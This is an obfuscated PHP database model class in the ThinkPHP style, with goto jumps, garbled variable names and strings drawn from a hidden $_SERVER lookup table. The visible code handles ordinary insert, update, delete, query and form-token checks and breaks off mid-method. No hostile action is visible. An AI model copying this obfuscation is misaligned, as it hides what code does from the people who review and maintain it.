<?php
 goto bï¢ÂÉ÷’Ï; cñ™§¶Å–: define($_SERVER[¯µç›È¢][249], 1); define($_SERVER[¯µç›È¢][250], 0); define($_SERVER[¯µç›È¢][251], 2); goto F¿èªÄ«¢; F¿èªÄ«¢: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\145", "\x6f\x72\x64\145\162", "\141\x6c\x69\x61\163", "\x68\x61\x76\x69\x6e\147", "\x67\x72\157\x75\160", "\x6c\157\x63\x6b", "\x64\151\163\x74\151\x6e\x63\164", "\141\x75\x74\x6f", "\146\x69\154\x74\x65\162", "\166\x61\154\151\144\x61\164\x65", "\162\x65\x73\x75\x6c\164", "\x62\x69\x6e\144", "\164\x6f\x6b\145\156"); public function __construct($€š•ªû‘ = '', $ã‹äƒ² = '', $ñÌ¶•û = '') { $ì«…İƒ‰ =& $_SERVER[¯µç›È¢]; $this->_initialize(); if (!empty($€š•ªû‘)) { if (strpos($€š•ªû‘, $ì«…İƒ‰[10])) { list($this->dbName, $this->name) = explode($ì«…İƒ‰[10], $€š•ªû‘); } else { $this->name = $€š•ªû‘; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ã‹äƒ²)) { $this->tablePrefix = $ì«…İƒ‰[12]; } elseif ($ì«…İƒ‰[12] != $ã‹äƒ²) { $this->tablePrefix = $ã‹äƒ²; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ì«…İƒ‰[252]); } $this->db(0, empty($this->connection) ? $ñÌ¶•û : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ÒÏÛŸ„¤ =& $_SERVER[¯µç›È¢]; if (empty($this->fields)) { if (think_config($ÒÏÛŸ„¤[253])) { $ùÙÍ“÷è = $this->dbName ? $this->dbName : think_config($ÒÏÛŸ„¤[254]); $„ŞÂ¨ïí = think_var_cache($ÒÏÛŸ„¤[255] . strtolower(get_path_this($ùÙÍ“÷è) . $ÒÏÛŸ„¤[10] . $this->name)); if ($„ŞÂ¨ïí) { $‡ËÄ«Ú‡ = think_config($ÒÏÛŸ„¤[256]); if (empty($‡ËÄ«Ú‡) || $„ŞÂ¨ïí[$ÒÏÛŸ„¤[257]] == $‡ËÄ«Ú‡) { $this->fields = $„ŞÂ¨ïí; return; } } } $this->flush(); } } public function flush() { $ËïÇ½Š =& $_SERVER[¯µç›È¢]; $this->db->setModel($this->name); $¢şõŒƒÏ = $this->db->getFields($this->getTableName()); if (!$¢şõŒƒÏ) { return !1; } $this->fields = array_keys($¢şõŒƒÏ); $this->fields[$ËïÇ½Š[258]] = !1; foreach ($¢şõŒƒÏ as $ğ»Ö¥§Ì => $§ö‘¶Æ‰) { $¡ê¡‡ï[$ğ»Ö¥§Ì] = $§ö‘¶Æ‰[$ËïÇ½Š[33]]; if ($§ö‘¶Æ‰[$ËïÇ½Š[39]]) { $this->fields[$ËïÇ½Š[259]] = $ğ»Ö¥§Ì; if ($§ö‘¶Æ‰[$ËïÇ½Š[42]]) { $this->fields[$ËïÇ½Š[258]] = !0; } } } $this->fields[$ËïÇ½Š[260]] = $¡ê¡‡ï; if (think_config($ËïÇ½Š[256])) { $this->fields[$ËïÇ½Š[257]] = think_config($ËïÇ½Š[256]); } if (think_config($ËïÇ½Š[253])) { $ó½¤¼Ö˜ = $this->dbName ? $this->dbName : think_config($ËïÇ½Š[254]); think_var_cache($ËïÇ½Š[255] . strtolower(get_path_this($ó½¤¼Ö˜) . $ËïÇ½Š[10] . $this->name), $this->fields); } } public function switchModel($ˆ¸…ˆ”, $›ñ¾¨Ş¨ = array()) { $„î±Âàƒ =& $_SERVER[¯µç›È¢]; $ŸØöŠ‰ = ucwords(strtolower($ˆ¸…ˆ”)) . $„î±Âàƒ[261]; if (!class_exists($ŸØöŠ‰)) { think_exception($ŸØöŠ‰ . think_lang($„î±Âàƒ[262])); } $this->_extModel = new $ŸØöŠ‰($this->name); if (!empty($›ñ¾¨Ş¨)) { foreach ($›ñ¾¨Ş¨ as $¹ÒåŠ÷) { $this->_extModel->setProperty($¹ÒåŠ÷, $this->{$¹ÒåŠ÷}); } } return $this->_extModel; } public function __set($•£›ÑÕÓ, $äó¸Ôµö) { $this->data[$•£›ÑÕÓ] = $äó¸Ôµö; } public function __get($ú¤¬î¡¦) { return isset($this->data[$ú¤¬î¡¦]) ? $this->data[$ú¤¬î¡¦] : null; } public function __isset($°Ùƒ¢ã¿) { return isset($this->data[$°Ùƒ¢ã¿]); } public function __unset($¸ÍıŸÈú) { unset($this->data[$¸ÍıŸÈú]); } public function __call($ÂöşÍÌ¸, $Ï¸óÕÃ) { $ÓƒŒå‰• =& $_SERVER[¯µç›È¢]; if (in_array(strtolower($ÂöşÍÌ¸), $this->methods, !0)) { $this->options[strtolower($ÂöşÍÌ¸)] = $Ï¸óÕÃ[0]; return $this; } elseif (in_array(strtolower($ÂöşÍÌ¸), array($ÓƒŒå‰•[263], $ÓƒŒå‰•[264], $ÓƒŒå‰•[265], $ÓƒŒå‰•[266], $ÓƒŒå‰•[267]), !0)) { $õ÷’èÙ– = isset($Ï¸óÕÃ[0]) ? $Ï¸óÕÃ[0] : $ÓƒŒå‰•[195]; $õ÷’èÙ– = $this->db->parseKey($õ÷’èÙ–); return $this->getField(strtoupper($ÂöşÍÌ¸) . $ÓƒŒå‰•[268] . $õ÷’èÙ– . $ÓƒŒå‰•[269] . $ÂöşÍÌ¸, $ÓƒŒå‰•[263]); } elseif (strtolower(substr($ÂöşÍÌ¸, 0, 5)) == $ÓƒŒå‰•[270]) { $õ÷’èÙ– = think_parse_name(substr($ÂöşÍÌ¸, 5)); $ÆüÙ»İ[$õ÷’èÙ–] = $Ï¸óÕÃ[0]; return $this->where($ÆüÙ»İ)->find(); } elseif (strtolower(substr($ÂöşÍÌ¸, 0, 10)) == $ÓƒŒå‰•[271]) { $†¤ıÊÙ = think_parse_name(substr($ÂöşÍÌ¸, 10)); $ÆüÙ»İ[$†¤ıÊÙ] = $Ï¸óÕÃ[0]; return $this->where($ÆüÙ»İ)->getField($Ï¸óÕÃ[1]); } elseif (isset($this->_scope[$ÂöşÍÌ¸])) { return $this->scope($ÂöşÍÌ¸, $Ï¸óÕÃ[0]); } elseif (method_exists($this, $ÂöşÍÌ¸)) { array_unshift($Ï¸óÕÃ, $ÂöşÍÌ¸); return call_user_func_array(array($this, $ÓƒŒå‰•[272]), $Ï¸óÕÃ); } else { return call_user_func_array(array(parent, $ÂöşÍÌ¸), $Ï¸óÕÃ); } } protected function call() { $’¨ù¬¹ =& $_SERVER[¯µç›È¢]; $à÷‘ûô¼ = func_get_args(); $Øà§´æ• = array_shift($à÷‘ûô¼); $”Ï­–üô = $Øà§´æ•; if (is_array($Øà§´æ•)) { $”Ï­–üô = $Øà§´æ•[1]; $Øà§´æ• = $Øà§´æ•[0]; } $í™®éıÀ = count($à÷‘ûô¼) - 1; if (isset($à÷‘ûô¼[$í™®éıÀ]) && $à÷‘ûô¼[$í™®éıÀ] === $Øà§´æ•) { think_exception(__CLASS__ . $’¨ù¬¹[4] . $Øà§´æ• . think_lang($’¨ù¬¹[273])); return; } $à÷‘ûô¼[] = $Øà§´æ•; if (method_exists($this, $’¨ù¬¹[274])) { $¤ğÆ°êÓ = call_user_func_array(array($this, $’¨ù¬¹[275]), array($”Ï­–üô, $à÷‘ûô¼)); if (!is_null($¤ğÆ°êÓ) && $¤ğÆ°êÓ !== !1) { return $¤ğÆ°êÓ; } } $ì³Íúæô = call_user_func_array(array($this, $Øà§´æ•), $à÷‘ûô¼); if (method_exists($this, $’¨ù¬¹[276])) { $¤ğÆ°êÓ = call_user_func_array(array($this, $’¨ù¬¹[277]), array($”Ï­–üô, $à÷‘ûô¼, $ì³Íúæô)); if ($¤ğÆ°êÓ) { return $¤ğÆ°êÓ; } } return $ì³Íúæô; } protected function _initialize() { } protected function _facade($úëœéÙÏ) { $ñŠõÁ— =& $_SERVER[¯µç›È¢]; if (!empty($this->fields)) { foreach ($úëœéÙÏ as $ô«ÅÛ¢ó => $©”¶°‡) { if (is_array($this->fields) && !in_array($ô«ÅÛ¢ó, $this->fields, !0)) { unset($úëœéÙÏ[$ô«ÅÛ¢ó]); } elseif (is_scalar($©”¶°‡)) { $this->_parseType($úëœéÙÏ, $ô«ÅÛ¢ó); } } } if (!empty($this->options[$ñŠõÁ—[278]])) { $úëœéÙÏ = array_map($this->options[$ñŠõÁ—[278]], $úëœéÙÏ); unset($this->options[$ñŠõÁ—[278]]); } $this->_beforeWrite($úëœéÙÏ); return $úëœéÙÏ; } protected function _beforeWrite(&$ÂÑÆÄü–) { } public function add($­÷‘äÍÕ = '', $À”‹É÷™ = array(), $°šÆˆŒ  = false) { if (empty($­÷‘äÍÕ)) { if (!empty($this->data)) { $­÷‘äÍÕ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¯µç›È¢][279]); return !1; } } $À”‹É÷™ = $this->_parseOptions($À”‹É÷™); $­÷‘äÍÕ = $this->_facade($­÷‘äÍÕ); if (!1 === $this->_beforeInsert($­÷‘äÍÕ, $À”‹É÷™)) { return !1; } $§¥ÁşÆ€ = $this->db->insert($­÷‘äÍÕ, $À”‹É÷™, $°šÆˆŒ ); if (!1 !== $§¥ÁşÆ€) { $–”ÜÌ»ó = $this->getLastInsID(); if ($–”ÜÌ»ó) { $­÷‘äÍÕ[$this->getPk()] = $–”ÜÌ»ó; $this->_after_insert($­÷‘äÍÕ, $À”‹É÷™); return $–”ÜÌ»ó; } $this->_after_insert($­÷‘äÍÕ, $À”‹É÷™); } return $§¥ÁşÆ€; } protected function _beforeInsert(&$óæí”—Ç, $öº£…Ã) { } protected function _after_insert($›´“È°, $İ¼ˆà„) { } public function addAll($ıÀ¦ÍÒæ, $â®ÒÆºâ = array(), $ù°Ÿ‘Ò = false) { $š»®ÛÛ =& $_SERVER[¯µç›È¢]; if (empty($ıÀ¦ÍÒæ)) { $this->error = think_lang($š»®ÛÛ[279]); return !1; } $â®ÒÆºâ = $this->_parseOptions($â®ÒÆºâ); foreach ($ıÀ¦ÍÒæ as $õÊ‰İÌä => $äÄşßÙ ) { $ıÀ¦ÍÒæ[$õÊ‰İÌä] = $this->_facade($äÄşßÙ ); } if (method_exists($this->db, $š»®ÛÛ[280])) { $è€¡öÜõ = $this->db->insertAll($ıÀ¦ÍÒæ, $â®ÒÆºâ, $ù°Ÿ‘Ò); } else { $this->startTrans(); foreach ($ıÀ¦ÍÒæ as $õÊ‰İÌä => $äÄşßÙ ) { $è€¡öÜõ = $this->db->insert($äÄşßÙ , $â®ÒÆºâ, $ù°Ÿ‘Ò); } $this->commit(); } if (!1 !== $è€¡öÜõ) { $ôæ•óşÂ = $this->getLastInsID(); if ($ôæ•óşÂ) { return $ôæ•óşÂ; } } return $è€¡öÜõ; } public function selectAdd($’¦ìÂ® = '', $äáÌ“Ë¼ = '', $¨Í’â = array()) { $¸åğÎ¢õ =& $_SERVER[¯µç›È¢]; $¨Í’â = $this->_parseOptions($¨Í’â); if (!1 === ($š†”¨Î¼ = $this->db->selectInsert($’¦ìÂ® ? $’¦ìÂ® : $¨Í’â[$¸åğÎ¢õ[281]], $äáÌ“Ë¼ ? $äáÌ“Ë¼ : $this->getTableName(), $¨Í’â))) { $this->error = think_lang($¸åğÎ¢õ[282]); return !1; } else { return $š†”¨Î¼; } } public function save($ÏÎÇşëæ = '', $ñùüá®å = array()) { $ÜÓæáŒí =& $_SERVER[¯µç›È¢]; if (empty($ÏÎÇşëæ)) { if (!empty($this->data)) { $ÏÎÇşëæ = $this->data; $this->data = array(); } else { $this->error = think_lang($ÜÓæáŒí[279]); return !1; } } $ÏÎÇşëæ = $this->_facade($ÏÎÇşëæ); $ñùüá®å = $this->_parseOptions($ñùüá®å); $ª®ÄÎ“ = $this->getPk(); if (!isset($ñùüá®å[$ÜÓæáŒí[283]])) { if (isset($ÏÎÇşëæ[$ª®ÄÎ“])) { $ËÁ×¢áº[$ª®ÄÎ“] = $ÏÎÇşëæ[$ª®ÄÎ“]; $ñùüá®å[$ÜÓæáŒí[283]] = $ËÁ×¢áº; unset($ÏÎÇşëæ[$ª®ÄÎ“]); } else { $this->error = think_lang($ÜÓæáŒí[282]); return !1; } } if (is_array($ñùüá®å[$ÜÓæáŒí[283]]) && isset($ñùüá®å[$ÜÓæáŒí[283]][$ª®ÄÎ“])) { $¾õ¿¯ğ£ = $ñùüá®å[$ÜÓæáŒí[283]][$ª®ÄÎ“]; } if (!1 === $this->_beforeUpdate($ÏÎÇşëæ, $ñùüá®å)) { return !1; } $è²¯”Å = $this->db->update($ÏÎÇşëæ, $ñùüá®å); if (!1 !== $è²¯”Å) { if (isset($¾õ¿¯ğ£)) { $ÏÎÇşëæ[$ª®ÄÎ“] = $¾õ¿¯ğ£; } $this->_afterUpdate($ÏÎÇşëæ, $ñùüá®å); } return $è²¯”Å; } protected function _beforeUpdate(&$ÙêÃÄĞ—, $÷ŞÊ£Ñ…) { } protected function _afterUpdate($®Œº¾Ğ¦, $‰ñ°âÄ÷) { } public function delete($ì’¥×ºì = array()) { $š·Ö¤ÌÛ =& $_SERVER[¯µç›È¢]; if (empty($ì’¥×ºì) && empty($this->options[$š·Ö¤ÌÛ[283]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ê«ö«º‚ = $this->getPk(); if (is_numeric($ì’¥×ºì) || is_string($ì’¥×ºì)) { if (strpos($ì’¥×ºì, $š·Ö¤ÌÛ[50])) { $’¸î”œ›[$ê«ö«º‚] = array($š·Ö¤ÌÛ[284], $ì’¥×ºì); } else { $’¸î”œ›[$ê«ö«º‚] = $ì’¥×ºì; } $this->options[$š·Ö¤ÌÛ[283]] = $’¸î”œ›; } $ì’¥×ºì = $this->_parseOptions(); if (is_array($ì’¥×ºì[$š·Ö¤ÌÛ[283]]) && isset($ì’¥×ºì[$š·Ö¤ÌÛ[283]][$ê«ö«º‚])) { $åÓø¿¥© = $ì’¥×ºì[$š·Ö¤ÌÛ[283]][$ê«ö«º‚]; } $¸›—ç‚ö = $this->db->delete($ì’¥×ºì); if (!1 !== $¸›—ç‚ö) { $ÖÃÑÆã¯ = array(); if (isset($åÓø¿¥©)) { $ÖÃÑÆã¯[$ê«ö«º‚] = $åÓø¿¥©; } $this->_after_delete($ÖÃÑÆã¯, $ì’¥×ºì); } return $¸›—ç‚ö; } protected function _after_delete($è£íŠû—, $Æñ¬÷”) { } public function select($ãàå‡¶š = array()) { $ã±¹‚èÏ =& $_SERVER[¯µç›È¢]; if (is_string($ãàå‡¶š) || is_numeric($ãàå‡¶š)) { $‚Á—•»‚ = $this->getPk(); if (strpos($ãàå‡¶š, $ã±¹‚èÏ[50])) { $Îû©åÁ‘[$‚Á—•»‚] = array($ã±¹‚èÏ[284], $ãàå‡¶š); } else { $Îû©åÁ‘[$‚Á—•»‚] = $ãàå‡¶š; } $this->options[$ã±¹‚èÏ[283]] = $Îû©åÁ‘; } elseif (!1 === $ãàå‡¶š) { $ãàå‡¶š = $this->_parseOptions(); return $ã±¹‚èÏ[285] . $this->db->buildSelectSql($ãàå‡¶š) . $ã±¹‚èÏ[286]; } $ãàå‡¶š = $this->_parseOptions(); $‹ÖÍµ¦ı = $this->db->select($ãàå‡¶š); if (!1 === $‹ÖÍµ¦ı) { return !1; } if (empty($‹ÖÍµ¦ı)) { return null; } $this->_afterSelect($‹ÖÍµ¦ı, $ãàå‡¶š); return $‹ÖÍµ¦ı; } protected function _afterSelect(&$ÈÈË‘Ì¡, $”îé‹À) { } public function buildSql($­ùÅÑÉ† = array()) { $’×ÎˆŒ¤ =& $_SERVER[¯µç›È¢]; $­ùÅÑÉ† = $this->_parseOptions($­ùÅÑÉ†); return $’×ÎˆŒ¤[285] . $this->db->buildSelectSql($­ùÅÑÉ†) . $’×ÎˆŒ¤[286]; } public function optionsValue($ØËÈÄŸ‹ = null) { if (is_null($ØËÈÄŸ‹)) { return $this->options; } elseif (is_array($ØËÈÄŸ‹)) { $this->options = array_merge($this->options, $ØËÈÄŸ‹); } } protected function _parseOptions($Ò‰«¦á = array()) { $Ôæ›¾¯‡ =& $_SERVER[¯µç›È¢]; if (is_array($Ò‰«¦á)) { $Ò‰«¦á = array_merge($this->options, $Ò‰«¦á); } $this->options = array(); if (!isset($Ò‰«¦á[$Ôæ›¾¯‡[287]])) { $Ò‰«¦á[$Ôæ›¾¯‡[287]] = $this->getTableName(); $£óÆĞ¥„ = $this->fields; } else { $£óÆĞ¥„ = $this->getDbFields(); } if (!empty($Ò‰«¦á[$Ôæ›¾¯‡[288]])) { $Ò‰«¦á[$Ôæ›¾¯‡[287]] .= $Ôæ›¾¯‡[53] . $Ò‰«¦á[$Ôæ›¾¯‡[288]]; } $Ò‰«¦á[$Ôæ›¾¯‡[289]] = $this->name; if (isset($Ò‰«¦á[$Ôæ›¾¯‡[283]]) && is_array($Ò‰«¦á[$Ôæ›¾¯‡[283]]) && !empty($£óÆĞ¥„) && !isset($Ò‰«¦á[$Ôæ›¾¯‡[290]]) && !isset($Ò‰«¦á[$Ôæ›¾¯‡[287]])) { foreach ($Ò‰«¦á[$Ôæ›¾¯‡[283]] as $¾¨¢Æè => $€åë˜›™) { $¾¨¢Æè = trim($¾¨¢Æè); if (in_array($¾¨¢Æè, $£óÆĞ¥„, !0)) { if (is_scalar($€åë˜›™)) { $this->_parseType($Ò‰«¦á[$Ôæ›¾¯‡[283]], $¾¨¢Æè); } } elseif (!is_numeric($¾¨¢Æè) && $Ôæ›¾¯‡[11] != substr($¾¨¢Æè, 0, 1) && !1 === strpos($¾¨¢Æè, $Ôæ›¾¯‡[10]) && !1 === strpos($¾¨¢Æè, $Ôæ›¾¯‡[268]) && !1 === strpos($¾¨¢Æè, $Ôæ›¾¯‡[291]) && !1 === strpos($¾¨¢Æè, $Ôæ›¾¯‡[292])) { unset($Ò‰«¦á[$Ôæ›¾¯‡[283]][$¾¨¢Æè]); } } } $this->_options_filter($Ò‰«¦á); return $Ò‰«¦á; } protected function _options_filter(&$¼¨ÙƒÆÃ) { } protected function _parseType(&$¡µ²¹Íˆ, $½¦š£öÕ) { $¹ï­Ã¶ù =& $_SERVER[¯µç›È¢]; if (empty($this->options[$¹ï­Ã¶ù[293]][$¹ï­Ã¶ù[4] . $½¦š£öÕ])) { $¢—’ìõé = strtolower($this->fields[$¹ï­Ã¶ù[260]][$½¦š£öÕ]); if (!1 !== strpos($¢—’ìõé, $¹ï­Ã¶ù[294])) { } elseif (!1 === strpos($¢—’ìõé, $¹ï­Ã¶ù[295]) && !1 !== strpos($¢—’ìõé, $¹ï­Ã¶ù[296])) { $¡µ²¹Íˆ[$½¦š£öÕ] = intval($¡µ²¹Íˆ[$½¦š£öÕ]); } elseif (!1 !== strpos($¢—’ìõé, $¹ï­Ã¶ù[297]) || !1 !== strpos($¢—’ìõé, $¹ï­Ã¶ù[298])) { $¡µ²¹Íˆ[$½¦š£öÕ] = floatval($¡µ²¹Íˆ[$½¦š£öÕ]); } elseif (!1 !== strpos($¢—’ìõé, $¹ï­Ã¶ù[299])) { $¡µ²¹Íˆ[$½¦š£öÕ] = (bool) $¡µ²¹Íˆ[$½¦š£öÕ]; } } } public function find($œåğíµ÷ = array()) { $·èåû½Í =& $_SERVER[¯µç›È¢]; if (is_numeric($œåğíµ÷) || is_string($œåğíµ÷)) { $ÆğÛ¾ã[$this->getPk()] = intval($œåğíµ÷); $this->options[$·èåû½Í[283]] = $ÆğÛ¾ã; } $this->options[$·èåû½Í[300]] = 1; $œåğíµ÷ = $this->_parseOptions(); $òûªåŠ = $this->db->select($œåğíµ÷); if (!1 === $òûªåŠ) { return !1; } if (empty($òûªåŠ)) { return null; } $this->data = $òûªåŠ[0]; $this->_afterFind($this->data, $œåğíµ÷); if (!empty($this->options[$·èåû½Í[301]])) { return $this->returnResult($this->data, $this->options[$·èåû½Í[301]]); } return $this->data; } protected function _afterFind(&$–õ¼ÊÆ³, $§Œ½ü¨) { } protected function returnResult($ŒŒÇğ«ï, $¯¥ µ×û = '') { $ÁÈäªİ˜ =& $_SERVER[¯µç›È¢]; if ($¯¥ µ×û) { if (is_callable($¯¥ µ×û)) { return call_user_func($¯¥ µ×û, $ŒŒÇğ«ï); } switch (strtolower($¯¥ µ×û)) { case $ÁÈäªİ˜[302]: return json_encode($ŒŒÇğ«ï); case $ÁÈäªİ˜[303]: return xml_encode($ŒŒÇğ«ï); } } return $ŒŒÇğ«ï; } public function parseFieldsMap($„¶Â²¿Ü, $êèÍ”ä = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ü½†òÜ× => $éñé©æÁ) { if ($êèÍ”ä == 1) { if (isset($„¶Â²¿Ü[$éñé©æÁ])) { $„¶Â²¿Ü[$ü½†òÜ×] = $„¶Â²¿Ü[$éñé©æÁ]; unset($„¶Â²¿Ü[$éñé©æÁ]); } } else { if (isset($„¶Â²¿Ü[$ü½†òÜ×])) { $„¶Â²¿Ü[$éñé©æÁ] = $„¶Â²¿Ü[$ü½†òÜ×]; unset($„¶Â²¿Ü[$ü½†òÜ×]); } } } } return $„¶Â²¿Ü; } public function setField($Ë§Çë›, $ÙüøÅÅ = '') { if (is_array($Ë§Çë›)) { $ªõÛñëË = $Ë§Çë›; } else { $ªõÛñëË[$Ë§Çë›] = $ÙüøÅÅ; } return $this->save($ªõÛñëË); } public function setAdd($Ù¹ã¸ù, $¿Àı•òî = 1) { $÷Šˆ¡‘ =& $_SERVER[¯µç›È¢]; $şÂíÙëÈ = $Ù¹ã¸ù . $÷Šˆ¡‘[304] . $¿Àı•òî; if ($¿Àı•òî < 0) { $şÂíÙëÈ = $Ù¹ã¸ù . $¿Àı•òî; } return $this->setField($Ù¹ã¸ù, array($÷Šˆ¡‘[305], $şÂíÙëÈ)); } public function getField($üõ ¯ïƒ, $şäîî§ì = null) { $ªœøò´ =& $_SERVER[¯µç›È¢]; $ øõÉÑ¨[$ªœøò´[281]] = $üõ ¯ïƒ; $ øõÉÑ¨ = $this->_parseOptions($ øõÉÑ¨); $üõ ¯ïƒ = trim($üõ ¯ïƒ); if (strpos($üõ ¯ïƒ, $ªœøò´[50])) { if (!isset($ øõÉÑ¨[$ªœøò´[300]])) { $ øõÉÑ¨[$ªœøò´[300]] = is_numeric($şäîî§ì) ? $şäîî§ì : $ªœøò´[12]; } $ŠŠ‚äÌÆ = $this->db->select($ øõÉÑ¨); if (!empty($ŠŠ‚äÌÆ)) { $šÓÔ‰š = explode($ªœøò´[50], $üõ ¯ïƒ); $üõ ¯ïƒ = array_keys($ŠŠ‚äÌÆ[0]); $²ëâÂ¥µ = array_shift($üõ ¯ïƒ); $øµ‘¥ = array_shift($üõ ¯ïƒ); $Ç‚İ¬“ = array(); $ı¤£êÍø = count($šÓÔ‰š); foreach ($ŠŠ‚äÌÆ as $—íÔ–•) { $×ŸÀ¤ê€ = $—íÔ–•[$²ëâÂ¥µ]; if (2 == $ı¤£êÍø) { $Ç‚İ¬“[$×ŸÀ¤ê€] = $—íÔ–•[$øµ‘¥]; } else { $Ç‚İ¬“[$×ŸÀ¤ê€] = is_string($şäîî§ì) ? implode($şäîî§ì, $—íÔ–•) : $—íÔ–•; } } return $Ç‚İ¬“; } } else { if (!0 !== $şäîî§ì) { $ øõÉÑ¨[$ªœøò´[300]] = is_numeric($şäîî§ì) ? $şäîî§ì : 1; } if ($şäîî§ì === $ªœøò´[263]) { unset($ øõÉÑ¨[$ªœøò´[300]]); } $—íÔ–• = $this->db->select($ øõÉÑ¨); if (!empty($—íÔ–•)) { if ($şäîî§ì === $ªœøò´[263]) { return reset($—íÔ–•[0]); } if (!0 !== $şäîî§ì && 1 == $ øõÉÑ¨[$ªœøò´[300]]) { return reset($—íÔ–•[0]); } foreach ($—íÔ–• as $À ğéæ¨) { $ıñìÃ¤®[] = $À ğéæ¨[$üõ ¯ïƒ]; } return $ıñìÃ¤®; } } return null; } public function create($˜…³ïÚÊ = '', $–‰ØÜÎè = '') { $‡ÚÛÄ…º =& $_SERVER[¯µç›È¢]; if (empty($˜…³ïÚÊ)) { $˜…³ïÚÊ = $_POST; } elseif (is_object($˜…³ïÚÊ)) { $˜…³ïÚÊ = get_object_vars($˜…³ïÚÊ); } if (empty($˜…³ïÚÊ) || !is_array($˜…³ïÚÊ)) { $this->error = think_lang($‡ÚÛÄ…º[279]); return !1; } $˜…³ïÚÊ = $this->parseFieldsMap($˜…³ïÚÊ, 0); $–‰ØÜÎè = $–‰ØÜÎè ? $–‰ØÜÎè : (!empty($˜…³ïÚÊ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$‡ÚÛÄ…º[281]])) { $ĞÛæ˜òá = $this->options[$‡ÚÛÄ…º[281]]; unset($this->options[$‡ÚÛÄ…º[281]]); } elseif ($–‰ØÜÎè == THINK_MODEL_INSERT && isset($this->insertFields)) { $ĞÛæ˜òá = $this->insertFields; } elseif ($–‰ØÜÎè == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ĞÛæ˜òá = $this->updateFields; } if (isset($ĞÛæ˜òá)) { if (is_string($ĞÛæ˜òá)) { $ĞÛæ˜òá = explode($‡ÚÛÄ…º[50], $ĞÛæ˜òá); } if (think_config($‡ÚÛÄ…º[306])) { $ĞÛæ˜òá[] = think_config($‡ÚÛÄ…º[307]); } foreach ($˜…³ïÚÊ as $ÛœÛÛ©İ => $ö¾ç÷½ş) { if (!in_array($ÛœÛÛ©İ, $ĞÛæ˜òá)) { unset($˜…³ïÚÊ[$ÛœÛÛ©İ]); } } } if (!$this->autoValidation($˜…³ïÚÊ, $–‰ØÜÎè)) { return !1; } if (!$this->autoCheckToken($˜…³ïÚÊ)) { $this->error = think_lang($‡ÚÛÄ…º[308]); return !1; } if ($this->autoCheckFields) { $ĞÛæ˜òá = $this->getDbFields(); foreach ($˜…³ïÚÊ as $ÛœÛÛ©İ => $ö¾ç÷½ş) { if (!in_array($ÛœÛÛ©İ, $ĞÛæ˜òá)) { unset($˜…³ïÚÊ[$ÛœÛÛ©İ]); } elseif (MAGIC_QUOTES_GPC && is_string($ö¾ç÷½ş)) { $˜…³ïÚÊ[$ÛœÛÛ©İ] = stripslashes($ö¾ç÷½ş); } } } $this->autoOperation($˜…³ïÚÊ, $–‰ØÜÎè); $this->data = $˜…³ïÚÊ; return $˜…³ïÚÊ; } public function autoCheckToken($°œùëöÌ) { $ÒÛ¡Œ£Á =& $_SERVER[¯µç›È¢]; if (isset($this->options[$ÒÛ¡Œ£Á[309]]) && !$this->options[$ÒÛ¡Œ£Á[309]]) { return !0; } if (think_config($ÒÛ¡Œ£Á[306])) { $ö¥ŞÑı = think_config($ÒÛ¡Œ£Á[307]); if (!isset($°œùëöÌ[$ö¥ŞÑı]) || Session::get($ö¥ŞÑı)) { return !1; } list($ŞóÆİ”, $ûœ´½÷ì) = explode($ÒÛ¡Œ£Á[11], $°œùëöÌ[$ö¥ŞÑı]); if ($ûœ´½÷ì && Session::get($ö¥ŞÑı . $ÒÛ¡Œ£Á[10] . $ŞóÆİ”) === $ûœ´½÷ì) { Session::remove($ö¥ŞÑı . $ÒÛ¡Œ£Á[10] . $ŞóÆİ”); return !0; } if (think_config($ÒÛ¡Œ£Á[310])) { Session::remove($ö¥ŞÑı . $ÒÛ¡Œ£Á[10] . $ŞóÆİ”); } return !1; } return !0; } public function regex($ÈË­ôï, $ªÇ„˜Ÿ) { $¬šİøóù =& $_SERVER[¯µç›È¢]; $ÈÎùÜ¬È = array($¬šİøóù[311] => $¬šİøóù[312], $¬šİøóù[313] => $¬šİøóù[314], $¬šİøóù[315] => $¬šİøóù[316], $¬šİøóù[317] => $¬šİøóù[318], $¬šİøóù[319] => $¬šİøóù[320], $¬šİøóù[321] => $¬šİøóù[322], $¬šİøóù[323] => $¬šİøóù[324], $¬šİøóù[298] => $¬šİøóù[325], $¬šİøóù[326] => $¬šİøóù[327]); if (isset($ÈÎùÜ¬È[strtolower($ªÇ„˜Ÿ)])) { $ªÇ„˜Ÿ = $ÈÎùÜ¬È[strtolower($ªÇ„˜Ÿ)]; } return preg_match($ªÇ„˜Ÿ, $ÈË­ôï) === 1; } private function autoOperation(&$Æá‚¨³®, $…ã‹š¯) { $Á‹Á·¬ =& $_SERVER[¯µç›È¢]; if (!empty($this->options[$Á‹Á·¬[328]])) { $Ì˜°ßÁä = $this->options[$Á‹Á·¬[328]]; unset($this->options[$Á‹Á·¬[328]]); } elseif (!empty($this->_auto)) { $Ì˜°ßÁä = $this->_auto; } if (isset($Ì˜°ßÁä)) { foreach ($Ì˜°ßÁä as $§Ùñ‡Èä) { if (empty($§Ùñ‡Èä[2])) { $§Ùñ‡Èä[2] = THINK_MODEL_INSERT; } if ($…ã‹š¯ == $§Ùñ‡Èä[2] || $§Ùñ‡Èä[2] == THINK_MODEL_BOTH) { switch (trim($§Ùñ‡Èä[3])) { case $Á‹Á·¬[329]: case $Á‹Á·¬[330]: $ï¢À½àœ = isset($§Ùñ‡Èä[4]) ? (array) $§Ùñ‡Èä[4] : array(); if (isset($Æá‚¨³®[$§Ùñ‡Èä[0]])) { array_unshift($ï¢À½àœ, $Æá‚¨³®[$§Ùñ‡Èä[0]]); } if ($Á‹Á·¬[329] == $§Ùñ‡Èä[3]) { 